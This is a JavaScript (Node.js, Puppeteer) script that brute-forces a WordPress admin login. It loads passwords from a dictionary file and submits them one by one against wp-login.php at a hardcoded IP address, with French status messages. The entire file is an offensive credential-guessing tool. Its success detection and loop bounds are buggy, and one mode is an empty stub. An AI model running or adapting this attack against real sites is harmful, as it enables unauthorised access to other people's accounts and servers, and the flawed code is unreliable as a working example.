const fs = require('fs');
const puppeteer = require('puppeteer');

let table =  [];

var myArgs = process.argv.slice(2);

console.log(myArgs);

async function alphanueric(){

}

async function dico(){
  let data = fs.readFileSync('dico.dic', 'utf-8');
  table = data.replace(/(?:\r\n|\r|\n)/g, " ").split(" ");
  await Login(table);
}

async function Login(passwordArr){
  let browser = await puppeteer.launch(({headless: false}));
  let page = await browser.newPage();
  await page.goto('http://54.197.138.68/wp-login.php',{
      waitUntil: 'networkidle0',
    });
  await page.$eval("#user_login",(username) => (username.value = "admin"));
  await password(page,passwordArr);
  process.exit()
}

async function password(page,arr){
  for(i = 0; i <= arr.length; i++) {
      await page.waitForSelector('#user_pass');
      await page.type('#user_pass',arr[i]);
      await page.waitForSelector('#wp-submit');
      await page.click('#wp-submit');
      error = await page.waitForSelector('#login_error');
      if(error){
          console.log("erreur");
      }else{
        break;
      }
  }
  console.log("mdp trouvé");
}


switch (myArgs[0]) {
  case 'alphanumeric':
    console.log(myArgs[0], 'mode-alphanumeric');
    break;
  case 'dico':
    dico();
    console.log(myArgs[0], 'mode-dico');
    break;
  default: 
    console.log('veuillez entrer alphanumeric ou dico pour tester');
}

